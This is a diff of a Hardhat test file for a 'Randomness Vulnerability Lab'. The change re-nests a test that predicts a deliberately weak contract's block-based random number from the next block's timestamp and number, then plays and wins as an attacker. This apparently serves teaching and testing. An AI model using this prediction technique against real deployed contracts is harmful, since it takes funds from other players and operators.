@@ -20,28 +20,28 @@ describe("Randomness Vulnerability Lab", function () {
         expect(result).to.have.property("from");
 
     });
-});
 
-it("allows attacker to predict the random number and always win", async function () {
-    const { vulnerable } = await deployVulnerable();
-    const attacker = (await ethers.getSigners())[1];
+    it("allows attacker to predict the random number and always win", async function () {
+        const { vulnerable } = await deployVulnerable();
+        const attacker = (await ethers.getSigners())[1];
 
-    const currentBlock = await ethers.provider.getBlock("latest");
+        const currentBlock = await ethers.provider.getBlock("latest");
 
-    const nextBlockNumber = currentBlock.number + 1;
-    const nextTimestamp = currentBlock.timestamp + 1;
+        const nextBlockNumber = currentBlock.number + 1;
+        const nextTimestamp = currentBlock.timestamp + 1;
 
-    const predictedRandom = Number(
-        ethers.toBigInt(
-            ethers.keccak256(
-                ethers.solidityPacked(["uint256", "uint256"], [nextTimestamp, nextBlockNumber])
-            )
-        ) % 10n
-    );
+        const predictedRandom = Number(
+            ethers.toBigInt(
+                ethers.keccak256(
+                    ethers.solidityPacked(["uint256", "uint256"], [nextTimestamp, nextBlockNumber])
+                )
+            ) % 10n
+        );
 
-    const tx = await vulnerable.connect(attacker).play(predictedRandom);
+        const tx = await vulnerable.connect(attacker).play(predictedRandom);
 
-    const contractLastRandom = await vulnerable.lastRandom();
+        const contractLastRandom = await vulnerable.lastRandom();
 
-    expect(contractLastRandom).to.equal(predictedRandom);
+        expect(contractLastRandom).to.equal(predictedRandom);
+    });
 });
